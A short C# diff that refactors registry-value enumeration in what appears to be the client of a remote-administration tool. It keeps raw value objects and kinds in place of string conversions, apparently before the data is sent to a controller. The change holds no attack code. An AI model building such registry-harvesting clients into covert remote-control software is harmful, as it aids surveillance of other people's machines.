@@ -256,9 +256,9 @@ namespace xClient.Core.Registry
                 foreach (string valueName in key.GetValueNames())
                 {
                     RegistryValueKind valueType = key.GetValueKind(valueName);
-                    string valueData = key.GetValueKind(valueName).RegistryTypeToString(key.GetValue(valueName, string.Empty));
+                    object valueData = key.GetValue(valueName);
                     string actualValueName = String.IsNullOrEmpty(valueName) ? "(Default)" : valueName;
-                    values.Add(new RegValueData(actualValueName, valueType.RegistryTypeToString(), valueData));
+                    values.Add(new RegValueData(actualValueName, valueType, valueData));
                 }
 
                 //Maybe send null if empty (regValues)
